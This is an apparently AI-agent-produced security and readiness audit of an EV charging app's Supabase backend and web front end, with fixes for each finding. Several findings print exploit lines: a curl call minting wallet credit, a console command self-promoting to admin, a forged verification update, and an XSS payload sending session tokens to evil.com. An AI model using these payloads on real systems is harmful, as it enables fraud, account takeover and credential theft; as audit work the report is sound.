# WattsOn — Investor Readiness Audit

**Date:** 2026-05-12
**Branch reviewed:** `main` @ `9505125`
**Scope:** Every function in `src/`, `screens/`, `supabase/functions/`, `supabase/migrations/`, plus tests, config, and deployed bundle
**Reviewers:** 7 specialist agents (security, services, state, screens, database, edge functions, tests)
**Codebase size:** 235 source files, ~32K LOC, 30 test files, 7 Edge Functions, 12 SQL migrations

---

## TL;DR — Bottom Line for the Founder

**The product story is great. The implementation is not investor-ready as-is.** A competent technical due-diligence reviewer running `gitleaks` + a Supabase RLS audit will surface, within 30 minutes, findings that would either kill the round or compress the term sheet meaningfully. Most are mechanical to fix; some require a focused 1–2 week security sprint.

**There are three categories of issue:**

1. **Show-stoppers that an investor's tech DD will absolutely find** — RLS gaps, unauthenticated `process-payment`, secrets posture, fake "AI analysis", auto-confirm-email trigger. **Must fix before any DD round.**
2. **Demo-day landmines** — dead Settings rows ("Privacy Policy" does nothing), simulated `setInterval` charging counter, "Demo Mode" creating a fake user with `id:'demo-user'` against the real DB, Welcome screen stat that says "100+ stations" when reality is 435. **Must fix before any live demo.**
3. **Quality debt** — type errors, no logout cache reset (privacy bleed across users), missing indexes, hardcoded hex (light-mode toggle is a placebo), 10 of 34 test suites don't run. **Address in the next 2 sprints.**

**My estimate:** ~5–8 focused engineering days gets you to a defensible posture for a Series-A pitch with technical co-investors. Without that work, the security and integrity gaps undercut the entire "AI-powered, community-verified aggregator" narrative — because the code does not currently back up the marketing claims.

---

## 1. Critical Show-Stoppers (Fix Before ANY Investor Sees the Code or Live App)

### 1.1 `process-payment` Edge Function is essentially a money printer
**File:** `supabase/functions/process-payment/index.ts:21–86`

- No JWT verification — anyone with the function URL can POST
- No ownership check that the caller owns `walletId`
- Inline comment says: `// For now: simulate successful payment` — **no actual payment gateway integration**
- No idempotency key — fully replayable; network retry duplicates credits
- Wallet balance update is read-modify-write — classic race condition, lost updates under concurrency
- `Access-Control-Allow-Origin: *` — any website can credit any wallet
- Trusts client-supplied `type`/`method` — `type: 'admin_credit'` accepted with no validation
- Payment reference uses `Math.random()` — predictable, not crypto-random

**Impact:** `curl -X POST <function-url> -d '{"walletId":"<any>","amount":999999,"type":"topup","method":"card"}'` mints money.

**Fix:** Verify JWT, check `wallets.user_id == auth.uid()`, integrate Paymob/Fawry with HMAC webhook signature verification, add `idempotency_key UNIQUE` to `transactions`, replace balance math with atomic `UPDATE wallets SET balance = balance + $1 RETURNING balance`. **Until then, disable this function in production.**

---

### 1.2 Production Supabase JWT committed in plaintext to a public repo
**Files:**
- `src/core/config/supabase.ts:5–6` — production URL + anon JWT hardcoded as fallback
- `scripts/geocode_nominatim.sh` — same URL + JWT in plaintext
- `scripts/geocode_nominatim2.py` — same URL + JWT in plaintext
- `.env` — Anthropic key + Supabase **service-role** key both prefixed `EXPO_PUBLIC_`

**The anon JWT expires 2036-02-22 — a 12-year lifetime with no rotation policy.**

**Impact:** Any due-diligence reviewer running `gitleaks` / `trufflehog` will surface this as the first finding. The `EXPO_PUBLIC_` prefix on the service-role key means one careless `process.env.EXPO_PUBLIC_SUPABASE_SERVICE_KEY` reference anywhere in `src/` will inline god-mode credentials into every browser. The bundle is currently clean (verified in `dist/_expo/static/js/web/index-346cf45d1a72cafeb5012325be3b2843.js`) — but the trap is set.

**Fix:**
1. Rotate the Supabase JWT signing secret (forces session re-issue; acceptable pre-launch).
2. Rotate the Anthropic API key.
3. Rename `EXPO_PUBLIC_SUPABASE_SERVICE_KEY` → `SUPABASE_SERVICE_ROLE_KEY` and move to Supabase Edge Function secrets only.
4. Rename `EXPO_PUBLIC_ANTHROPIC_API_KEY` → `ANTHROPIC_API_KEY` and move to Edge Function secrets only.
5. Delete hardcoded fallbacks in `supabase.ts`; throw on missing env.
6. Rewrite the two scripts to read env vars.

---

### 1.3 Auto-confirm-email trigger left enabled in production
**File:** `supabase/migrations/20260325000004_triggers.sql:36–50`

Trigger `on_auth_user_confirm_email` sets `email_confirmed_at = NOW()` on every signup. Inline comment literally says *"In production, remove this trigger and enable email confirmation."* It was never removed.

**Impact:** Anyone can register an account under any email they don't own. Account takeover via password reset becomes trivial as soon as that flow ships. Phishing/impersonation (`ceo@competitor.com`, `support@wattson-ev.vercel.app`) wide open. This single line kills SOC2/ISO27001 readiness.

**Fix:** `DROP TRIGGER on_auth_user_confirm_email ON auth.users; DROP FUNCTION auto_confirm_email();` and enable Supabase email confirmation in the Auth dashboard.

---

### 1.4 Privilege escalation: any driver can self-promote to admin
**File:** `supabase/migrations/20260325000002_rls_policies.sql:19`

```sql
CREATE POLICY "Users can update own profile" ON user_profiles
  FOR UPDATE USING (auth.uid() = id);
```

No `WITH CHECK`, no column restriction. A driver can run from the browser console:
```js
await supabase.from('user_profiles').update({ role: 'admin' }).eq('id', auth.uid())
```

**Fix:**
```sql
CREATE POLICY "users_update_own_profile" ON user_profiles
  FOR UPDATE USING (auth.uid() = id)
  WITH CHECK (auth.uid() = id AND role = (SELECT role FROM user_profiles WHERE id = auth.uid()));
```
Or add a `BEFORE UPDATE` trigger that reverts `NEW.role := OLD.role` unless caller is `service_role`.

---

### 1.5 Tables with NO RLS enabled — anonymous user can dump everything
**File:** `supabase/migrations/20260325000001_initial_schema.sql`

The RLS migration enables RLS on *some* tables but leaves others unprotected:
- `providers` (contains `api_key_encrypted` — note: column is `text`, NOT actually encrypted)
- `ai_interactions` — every Claude prompt + response, with PII, for every user
- `station_analytics`
- `ads` (advertising data)

**Impact:** With just the anon key, anyone can `SELECT * FROM ai_interactions` and dump every user's chat history, AI cost reports, battery-health analyses — joining `user_id` against `user_profiles` reveals names, vehicles, charging locations and times. **GDPR Article 33 (72-hour breach notification) territory.** Egypt PDPL too.

**Fix:** `ALTER TABLE providers, ai_interactions, station_analytics, ads ENABLE ROW LEVEL SECURITY;` plus explicit SELECT/INSERT/UPDATE/DELETE policies (or `FOR ALL USING (false)` deny-by-default).

---

### 1.6 All Edge Functions trust client-supplied `userId` — cross-tenant data exfiltration
**Files:** Every AI Edge Function:
- `supabase/functions/ai-chat/index.ts:20–37`
- `supabase/functions/ai-battery-health/index.ts:19–32`
- `supabase/functions/ai-cost-optimizer/index.ts:19–27`
- `supabase/functions/ai-route-planner/index.ts:19–30`

Each function instantiates Supabase with the **service-role** key (bypasses all RLS) and reads `userId` straight from the request body. No JWT verification anywhere.

**Impact:** Any anonymous caller can pass `userId = <victim-uuid>` and pull the victim's profile (full_name, phone), vehicles (make/model/**license plate**), charging history (locations + timestamps = stalker dataset), and AI conversation history into the response or into a Claude prompt that gets logged.

**Fix:** Add an auth helper used by every function:
```ts
const authHeader = req.headers.get('Authorization');
const { data: { user }, error } = await supabase.auth.getUser(authHeader);
if (error || !user) return new Response('Unauthorized', { status: 401 });
const userId = user.id; // ignore body-provided userId
```

---

### 1.7 `submitted_stations` UPDATE policy = `USING (true)` — anyone can verify any station
**File:** `supabase/migrations/20260328000002_submitted_stations.sql:27`

The "3-distinct-user verification" check lives only in client-side `submittedStationService.verifyStation`. A malicious client can:
```js
await supabase.from('submitted_stations').update({
  verified_by: [uuid1, uuid2, uuid3],
  verification_count: 3,
  status: 'verified',
  latitude: <attacker_chosen>,
  longitude: <attacker_chosen>,
  name: "FREE CHARGE — visit example.com"
}).eq('id', any_id);
```

Then `verifyStation` promotes it into the production `stations` table.

**Impact:** Map data integrity gone. Attacker can rename every pending station, redirect users to malicious physical locations, or auto-verify 1,000 fake stations. The "community-verified" moat (a core differentiator the marketing copy compares to PlugShare) is bypassable in one SQL statement.

**Fix:** Restrict to `USING (auth.uid()::text = submitted_by)` for self-edits only; move verify/promote logic into a `SECURITY DEFINER` Postgres function that enforces "3 distinct authenticated verifiers, none of whom is the submitter."

---

### 1.8 No Anthropic spend cap on any AI Edge Function
**Files:** `ai-chat`, `ai-cost-optimizer`, `ai-route-planner`, `ai-battery-health`

- No rate limit, no per-user daily token budget, no global circuit breaker
- `ai-route-planner` ships the **entire 435-station catalog with connectors** into every prompt (~15–30K input tokens, ~$0.05–$0.10/call)
- CORS is `*` — anyone, from any website, authenticated or not

**Impact:** A single attacker running `for(i=0;i<1e6;i++) fetch(...)` from a browser tab drains your Anthropic budget overnight. At 10K daily route-plan calls, that's $500–$1,000/day on Claude alone, before normal usage.

**Fix:**
1. JWT-required + per-user token-bucket rate limiter backed by Postgres or Upstash (e.g., 10 calls/min, 100/day).
2. For `ai-route-planner`: pre-filter stations to a corridor around the great-circle line (haversine <50km), cap to ~20 candidates.
3. Cap `max_tokens` lower, set `temperature: 0` for JSON-output endpoints.
4. Lock CORS to your origins.

---

### 1.9 Stored XSS in map info windows + JWT in `localStorage` = session takeover
**File:** `src/driver/components/WebMap.tsx:177–206, 323–341`

`createInfoContent(s)` and `createHomeChargerInfo(hc)` build HTML strings via direct concatenation:
```js
const html = `<h3>${s.name}</h3><p>${s.address}</p>...
  <button onclick="window.parent.postMessage(${...},'*')">Report</button>`;
```

The `s.name` field comes from `submitted_stations` (anonymous-writable, see §1.7) and `home_chargers`. No HTML escaping. A submitted station name of `'); fetch('https://evil.com/?c='+localStorage.getItem('supabase.auth.token'); //` executes inline.

**Compounding:** Supabase stores the JWT in `localStorage` on web (`supabase.ts:9–17`). One malicious station name → every user who views the map has their session token stolen → full account takeover.

**Compounding further:** `MapScreen.web.tsx:144–185` `postMessage` listener has no `event.origin` check — any iframe or injected script can send messages that the parent processes.

**Fix:**
1. Use `document.createTextNode()` / DOM API instead of HTML strings — or aggressively escape via `String.prototype.replaceAll('<','&lt;')` etc.
2. Attach listeners via `addEventListener`, never via `onclick="..."` built from user data.
3. Add `event.source === iframeRef.current?.contentWindow` check to the postMessage listener.
4. Reject `<`, `>`, `"` characters in station names at submission time.
5. (Defense-in-depth) Move session storage to httpOnly cookies via a server-side bridge.

---

### 1.10 `vehicleAnalysisService` returns seeded random data as "AI analysis"
**File:** `src/core/services/vehicleAnalysisService.ts:63–194`

The "battery health score" (87%), monthly spending, top stations, charging patterns — **all computed from `seededRandom()`**. Same pattern in `aiContextService.buildContext` for `avgCostPerCharge`, `monthlySpend`. The function names imply real telemetry analysis.

**Impact:** Regulatory and reputational risk — claiming AI-powered analysis while showing seeded RNG to users. An investor who reads the file will lose trust in every other "AI" claim in the deck. A regulator (Egypt's Consumer Protection Agency, EU AI Act when relevant) will treat this as deceptive.

**Fix:** Either label the outputs as estimates/demo in the UI behind a `featureFlags.SIMULATED_TELEMETRY` flag, or wire real charging-session aggregates into the calculation.

---

### 1.11 "Demo Mode" injects `{ id: 'demo-user' }` into auth store, hitting the real DB
**File:** `screens/auth/WelcomeScreen.tsx:16–27, 178–182`

The "Explore Demo" link sets a fake user directly via `useAuthStore.setUser({ id: 'demo-user', ... })`. The user then navigates around; backend services (favoritesService, stationReportService, badgeService, wallet) silently fail RLS or write garbage rows tied to `demo-user`.

**Impact:** Investor clicks "Explore Demo" out of curiosity, taps "Submit Report" → DB insert with `userId='demo-user'` either pollutes the production data or hits a confusing RLS failure.

**Fix:** Either remove the demo path entirely before pitching, or route it through a real seeded demo account (RLS-isolated) and show a persistent "DEMO MODE" banner. At minimum, gate behind `__DEV__`.

---

### 1.12 `ChargingSessionScreen` fakes kWh with `setInterval` — visible in code review
**File:** `src/driver/screens/ChargingSessionScreen.tsx:20–29`

```js
useEffect(() => {
  const interval = setInterval(() => {
    setLocalKwh((prev) => prev + (connectorPowerKw / 3600) * 5);
    ...
  }, 5000);
}, []);
```

The kWh number ticks up on a timer with no real provider integration. Comment in file: *"in real app, comes from provider via Edge Function"*.

**Impact:** Any technical investor reading the code spots this. Combined with the entire booking/wallet/charging-session navigation tree being live despite `MEMORY.md` saying "no booking features," the booking stack reads as theater.

**Fix:** Remove `ChargingSessionScreen`, `BookingScreen`, `BookingsListScreen`, `BookingDetailScreen`, `TopUpScreen`, `WalletScreen` from `DriverNavigator.tsx` until OCPI provider integration is real. Hide `BookingsTab` and `WalletTab`.

---

### 1.13 Settings has 6 dead `onPress={() => {}}` rows including Privacy Policy and Terms
**File:** `src/driver/screens/SettingsScreen.tsx:35–45`

Rows for "Payment Methods", "Auto Top-Up", "Change Password", "Privacy Policy", "Terms of Service", "Contact Support" — all render the chevron arrow and look interactive but are no-ops.

**Impact:** Investor taps "Privacy Policy" → nothing happens. App feels half-finished. Privacy Policy + ToS are required to pass App Store review.

**Fix:** Remove the dead rows, or `Linking.openURL` a hosted policy page (which means you need to write the policies — required pre-launch anyway).

---

## 2. High-Severity Issues (Fix Before Demo Day)

### Security & Auth
- **H-1** CORS `*` on every Edge Function — `supabase/functions/*/index.ts:5`. Lock to `https://wattson-ev.vercel.app`.
- **H-2** Password policy is only `length >= 8`, no complexity, no breached-password check. (`src/core/utils/validators.ts:4`). Enable Supabase Auth's HaveIBeenPwned integration.
- **H-3** Signup-then-signin-on-collision flow turns the registration endpoint into a credential-stuffing oracle. (`src/core/auth/authService.ts:14–46`). Return a generic message.
- **H-4** Client-side rate limit only — `_reportTimestamps` is an in-memory array, defeated by page reload or direct `supabase.from('station_reports').insert(...)`. (`src/core/services/stationReportService.ts:54–64`). Move to Postgres trigger keyed on `auth.uid()`.
- **H-5** Proximity check (100m) is client-only, comparing untrusted `postMessage` coordinates. (`src/driver/screens/MapScreen.web.tsx:144–185`). Move to a `BEFORE INSERT` trigger.
- **H-6** Public storage bucket `station-photos` with unrestricted INSERT: no auth, no size limit, no content-type check. (`supabase/migrations/20260406000001_station_report_photos.sql:11–16`). Malware/CSAM upload vector.
- **H-7** No security headers on Vercel — no CSP, HSTS, X-Frame-Options. Add `vercel.json`.
- **H-8** `sync-ocm-stations` is publicly invocable and **destructive** — deactivates stations with `last_synced_at IS NULL`. Anyone can call it and wipe your 435-station catalog. Add a `SYNC_CRON_SECRET` header.
- **H-9** Prompt injection: user vehicle make/model, station names, AI chat history all interpolate into Claude prompts unsanitized. Wrap in `<user_input>` tags.

### Database
- **H-10** Two parallel station schemas — `stations` (FK to `providers`) and `ev_stations` (FK to `ev_providers`). Migration `20260327000001_add_new_stations.sql` inserts into `stations` without `provider_id` — **fresh-DB migration will fail on the `NOT NULL` constraint**. Pick one schema, write a consolidation migration.
- **H-11** `station_reports.station_id` is `TEXT` not `UUID`, no FK, INSERT policy is `WITH CHECK (true)` (open to anonymous). Convert to UUID with FK.
- **H-12** Missing indexes on FKs: `vehicles.user_id`, `vehicles.fleet_id`, `fleet_members.*`, `bookings.connector_id/station_id/vehicle_id/fleet_id`, `charging_sessions.booking_id/connector_id`, `reviews.user_id/station_id`, `wallets.user_id/fleet_id`. Every cascade DELETE and many joins are sequential scans.
- **H-13** Two-column B-tree on (latitude, longitude) cannot serve bounding-box queries. Enable PostGIS, add `geography(Point, 4326)` column with GiST index.
- **H-14** No `updated_at` auto-update triggers despite many tables declaring the column.
- **H-15** No CHECK constraints on `latitude`/`longitude` (–90/90, –180/180) or `price_per_kwh >= 0`.

### Services / Business Logic
- **H-16** `adService.trackImpression` and `trackClick` literally `update({ impressions: 0 })` and `update({ clicks: 0 })`. **All ad analytics permanently broken.** (`src/core/services/adService.ts:95–103`). Call `supabase.rpc('increment_ad_impression', { ad_id })`.
- **H-17** `chargingService.stopSession` has no `.select().single()` → returns null typed as `ChargingSession`. Receipts and post-charge screens crash.
- **H-18** `creditService.topUpCredits` is not atomic — read fleet balance, compute new, update fleets, update wallets, insert transactions, all as separate calls with no error checks. Race condition + partial-failure data corruption. Wrap in a Postgres RPC.
- **H-19** `walletService.getOrCreateWallet` is read-then-insert with no `ON CONFLICT` — concurrent calls create duplicate wallets.
- **H-20** SQL-injection-ish in `stationService.searchStations:158–162` — user `query` interpolated into PostgREST `.or()` filter string. Commas/parens break the filter or inject extra clauses. Escape or use `to_tsquery` RPC.
- **H-21** `statsService.getOverviewStats` reads `stations.provider` and `stations.governorate` as text columns — **these don't exist in the schema** (the real columns are `provider_id` and `area`/`city`). The function silently returns zeros via its catch-all. Investors see "0 governorates covered" on the dashboard.

### State Management
- **H-22** **No `queryClient.clear()` or store reset on `SIGNED_OUT`** — User B logs in on the same device and briefly sees User A's wallet balance, AI chat history, fleet, vehicles, favorites. **Privacy incident** (`src/core/auth/AuthProvider.tsx:66–68`).
- **H-23** **`stationReportService.submitReport` is not wrapped in a `useMutation`** — after a report, nothing invalidates `['stations']`, `['connectors', stationId]`, `['prediction', stationId]`. The *report submitter* sees their update; every other user sees stale data for 5 minutes. **The headline community-status feature silently fails.**
- **H-24** `useStations` queryKey includes raw `filter` object → unstable reference → refetches on every render.
- **H-25** `useAIChat` captures `messages` in a stale closure — rapid double-sends lose conversation context.
- **H-26** `useActiveSession` polls every 30s for every authenticated user regardless of whether they have an active session. 2.88M wasted Supabase requests/day at 1K DAU.
- **H-27** `useCreateBooking` only invalidates `['bookings']` — doesn't refresh wallet, connectors, or active-session pill.

### UI / Cross-Platform
- **H-28** Native `MapScreen.tsx` (150 lines) is a stub vs `MapScreen.web.tsx` (1050 lines). No proximity reporter, no community status, no reliability badges, no AI recs, no filter chips on iOS/Android. If the investor opens the Expo Go build (the natural place to demo a mobile aggregator), the wow-factor is gone.
- **H-29** Most driver screens use `import { colors } from '@/core/theme/colors'` (static singleton) instead of `useTheme()` — the dark/light toggle in ProfileScreen is a placebo.
- **H-30** Auth screens hardcode all strings — no `useTranslation()`. Arabic toggle breaks the first three screens an Egyptian investor sees.
- **H-31** Zero `accessibilityLabel` across the entire UI. Fails WCAG 2.1 AA, fails App Store accessibility guidelines, blocks any Egyptian government tender.
- **H-32** Welcome screen shows hardcoded "100+ stations / 12 verified" — actual count is 435 stations + 12 providers. Self-sabotaging the headline metric on the first screen.
- **H-33** `LocationGate` on web blocks the entire app forever if location is denied — no "Continue without location (use Cairo)" fallback.

---

## 3. Medium Severity (Address in Next Sprint)

A non-exhaustive list — see individual agent reports for details:

- **Error responses leak Postgres / Anthropic internals** in every Edge Function (`return { error: error.message }`). Standardize: `{ data?, error?: { code, message, requestId } }`.
- **PII over-collection to Anthropic** — full names, license plates, charging locations + timestamps sent on every chat turn. Confirm DPA, minimize data.
- **`googleMapsService` uses Maps API key client-side** for Directions/Places/Elevation REST. Proxy through Edge Functions; keep only Maps-JS key in browser.
- **`newsService` depends on `api.allorigins.win`** — third-party CORS proxy can MITM news content. Move to server-side fetch.
- **Pervasive `as any` casts** across services hide TypeScript drift. Generate types via `supabase gen types typescript`.
- **`role` in `raw_user_meta_data` trusted by `handle_new_user` trigger** — user can sign up with `role: 'admin'` via direct API call. Whitelist server-side.
- **`vehicleService.year` is `number | null` but `aiContextService` expects `number | undefined`** — TypeScript error in `AIAssistantScreen.tsx:352,439`.
- **`ProfileScreen.tsx:96` references non-existent `UserProfile.email`** — TypeScript error.
- **Web-only `outlineStyle: "none"` style** causes TypeScript errors in `MapScreen.web.tsx` and `SubmitStationScreen.tsx`. Use Platform.select.
- **`OnboardingScreen.navigation.replace('DriverTabs')` will throw** — route doesn't exist.
- **`StationDetailScreen` uses `Linking.openURL` on web** — opens same tab, loses user.
- **Settings dark/light toggle is a placebo** due to static `colors` imports (see H-29).
- **`useTopUp` optimistic balance update races with refetch** — balance flashes on top-up.
- **`useFleet` writes to fleetStore from a query effect** — stale fleet bleeds across accounts.
- **`ProximityReporter` `Animated.loop` not cleaned up on unmount** — battery drain.
- **No `getItemLayout`/virtualization on the desktop station list** (`ScrollView` with all 435 cards).
- **TextInputs missing `autoComplete`/`textContentType`** in auth screens — password managers can't autofill.
- **`stationReportService.uploadPhotos`** doesn't verify size, content-type, or upsert collisions.
- **`paymentService.topUp` doesn't validate edge-function response shape** — white-screen on backend change.
- **No DELETE policies on `reviews` and `station_reports`** — users can't remove their own content; moderation needs `service_role`.

---

## 4. Test Suite Status

**Current state:** 24 of 34 test suites pass, 10 fail to run (AsyncStorage native module not mocked), 1 stale assertion (Arabic translation test expects pre-rebrand "شحن مصر").

**Coverage gaps an investor's tech DD will ask about:**
- `paymentService` — **zero tests** on the money-in path
- `process-payment` Edge Function — **zero tests**
- `stationReportService` (proximity check, rate limit) — **zero tests**
- `claudeService` + `aiContextService` — **zero tests**
- `reliabilityScoreService` (the trust score shown on every station) — **zero tests**
- `submittedStationService` (3-verification flow) — **zero tests**
- `homeChargerService`, `badgeService`, `googleMapsService` — **zero tests**
- 40 of 42 screens — **zero tests** (only 2 auth smoke tests, both failing)
- 7 of 7 Edge Functions — **zero tests**

**Test smells to fix:** `.toBeDefined()` tautologies (aiService, authService, vehicleService), self-comparing distance test in locationService, `typeof === 'boolean'` tautologies in featureFlags, render-only component tests with no `fireEvent.press`.

**Minimum credible test suite for Series-A:**
1. Add `@react-native-async-storage/async-storage/jest/async-storage-mock` to `setupFilesAfterFramework` — unblocks 9 of 10 failing suites in one line.
2. Fix the stale i18n Arabic test.
3. Wire `npm test` into the Vercel deploy as a pre-build step.
4. Replace every `.toBeDefined()` assertion with one happy + one error path.
5. Integration tests against a local Supabase instance exercising RLS on `wallets`, `bookings`, `station_reports`.
6. Property tests for `_haversineKm`, the 100m proximity gate, and the 5/min rate limiter (with `jest.useFakeTimers()`).
7. Deno tests for the 7 Edge Functions.
8. At least one Playwright E2E test for signup → top-up → book → start-session → end-session.

---

## 5. Recommended Pre-Investor Action Plan

**Block 1 — Day 1 (security triage, must-fix-or-don't-pitch):**
1. Rotate Supabase JWT secret + Anthropic key. Move both out of `EXPO_PUBLIC_*`.
2. Delete `auto_confirm_email` trigger; enable Supabase email confirmation.
3. Disable `process-payment` Edge Function in production until §1.1 is fixed.
4. Disable `sync-ocm-stations` Edge Function until §1.8 has a cron secret.
5. Lock `user_profiles` UPDATE policy with `WITH CHECK` (§1.4).
6. Enable RLS on `providers`, `ai_interactions`, `station_analytics`, `ads` (§1.5).
7. Lock `submitted_stations` UPDATE policy to self-edits only (§1.7).
8. Remove `Booking`, `Wallet`, `TopUp`, `ChargingSession` from `DriverNavigator` (§1.12).
9. Remove "Demo Mode" or gate behind `__DEV__` with a banner (§1.11).
10. Delete dead `onPress={() => {}}` rows from Settings OR wire to hosted Privacy Policy / ToS pages (§1.13).

**Block 2 — Days 2–3 (auth posture & XSS):**
1. JWT verification helper for all 7 Edge Functions; ignore body-supplied `userId` (§1.6).
2. Per-user rate limit + token budget on AI endpoints (§1.8).
3. Pre-filter stations to a corridor in `ai-route-planner` (§1.8).
4. Fix `WebMap.tsx` XSS — escape user data, attach listeners via `addEventListener` (§1.9).
5. Add `event.origin` check to `postMessage` listener.
6. Add `vercel.json` with CSP, HSTS, XFO.
7. Lock CORS on all Edge Functions to your origins.
8. Fix Welcome screen stats — read live counts from DB.
9. Wire all auth + Settings + StationDetail + BookingsList screens to `useTranslation`.

**Block 3 — Days 4–5 (payment + data integrity):**
1. Replace `process-payment` simulator with Paymob/Fawry webhook-driven flow with HMAC verification.
2. Add `idempotency_key UNIQUE` to `transactions`. Move balance math to atomic Postgres RPC.
3. Wrap `creditService.topUpCredits` in a Postgres RPC transaction (§H-18).
4. Fix `adService.trackImpression/Click` to call `rpc('increment_ad_impression')` (§H-16).
5. Fix `chargingService.stopSession` to use `.select().single()` (§H-17).
6. Convert `station_reports.station_id` to UUID with FK; move proximity check to a `BEFORE INSERT` trigger (§H-11, §H-5).
7. Add the missing FK indexes (§H-12).
8. Decide on a single station schema and write the consolidation migration (§H-10).
9. Fix `statsService` schema mismatch (§H-21).

**Block 4 — Days 6–8 (state + UI hardening):**
1. Add a `resetAllStores()` helper and call it + `queryClient.clear()` on `SIGNED_OUT` (§H-22).
2. Wrap `submitReport` in a `useSubmitReport` mutation that invalidates the right keys (§H-23).
3. Bring native `MapScreen.tsx` to feature parity with the web version via a shared `useMapScreen` hook (§H-28).
4. Replace `import { colors }` with `useTheme()` across the codebase (§H-29).
5. Replace `vehicleAnalysisService` seeded RNG with real session-derived analytics OR label as demo (§1.10).
6. Add `accessibilityLabel` to every icon-only button (§H-31).
7. Add "Continue without location" fallback to `LocationGate` (§H-33).
8. Fix TypeScript errors (theme type, `Vehicle.year`, `ProfileScreen.email`, `outlineStyle`).

**Block 5 — Concurrent / ongoing (tests + CI):**
1. Add the AsyncStorage mock to unblock 9 failing test suites.
2. Add Semgrep + Gitleaks + Trivy GitHub Actions on every PR.
3. Write the 6 highest-value missing service tests: `paymentService`, `stationReportService`, `claudeService`, `reliabilityScoreService`, `submittedStationService`, `badgeService`.

---

## 6. What's Actually Good (Don't Lose This in the Rewrite)

- **The dark/cyan aesthetic is genuinely differentiated** — competitive analysis docs back this up.
- **Architecture is sound** — Zustand for ephemeral state, React Query for server state, sensible separation of services / queries / screens. The bugs are at the interfaces, not in the layering.
- **The 7 Edge Functions live server-side** — the team understood not to call Anthropic from the client. The implementation needs hardening, but the architectural decision is right.
- **AI assistant UX, ProximityReporter component, and StationBottomSheet are polished** — these are demo-worthy out of the box.
- **i18n catalog has 160+ keys with Arabic/English parity** — the infrastructure is there, it just isn't wired into half the screens.
- **329 EV models, 88 brands, 435 stations across 16 governorates** is real data — the moat is real, the marketing claims (3 of them — proximity, verification, rate-limit) just aren't enforced in the code yet.
- **Only 1 TODO comment in the entire codebase** — the team writes clean code.
- **`.env` properly gitignored**, no leaked secrets in the bundle (verified).
- **`stationService.computeStatus`, `_haversineKm`, and `creditService.calculateBonus` are real, correct, and well-tested.**

---

## 7. The Honest Investor-Pitch Verdict

**Pitch the product. Don't yet hand over the codebase.**

The narrative (Egypt's first AI-powered EV aggregator, 435 stations, 329 EV models, community-verified reliability, Arabic-first) is fundable. The execution is at "polished MVP" — which is fine for a seed pitch, but the specific gaps above are the ones a Series-A technical co-investor or YC office hours partner will find in the first 30 minutes of reading the repo. The credibility hit is not the existence of bugs (every codebase has them) — it's the specific *pattern* of "marketed control X is enforced only on the client side" repeated across proximity, rate limiting, verification, and payment. That pattern reads as either lack of security maturity or a deliberate marketing/reality gap, and neither is a story you want to tell at term-sheet stage.

With one focused week of work (the Day 1 + Day 2–3 + Day 4–5 blocks above), the same investor's audit comes back clean enough to pass. **The good news: every critical issue here is mechanical, well-understood, and concentrated in fewer than 20 files. None require redesign.**

---

**Reports were produced by 7 specialist agents in parallel:**
- Security Engineer — auth, edge functions, secrets, RLS, XSS
- Backend Architect — Edge Function review (7 functions)
- Database Optimizer — Supabase migrations (12 files)
- Code Reviewer (Services) — `src/core/services/` (30+ files)
- Code Reviewer (State) — Zustand stores + React Query hooks (~35 files)
- Code Reviewer (UI) — driver screens + components + auth screens + navigation (~50 files)
- Test Results Analyzer — coverage map, test smells, gaps

Full per-agent findings preserved in conversation transcript.
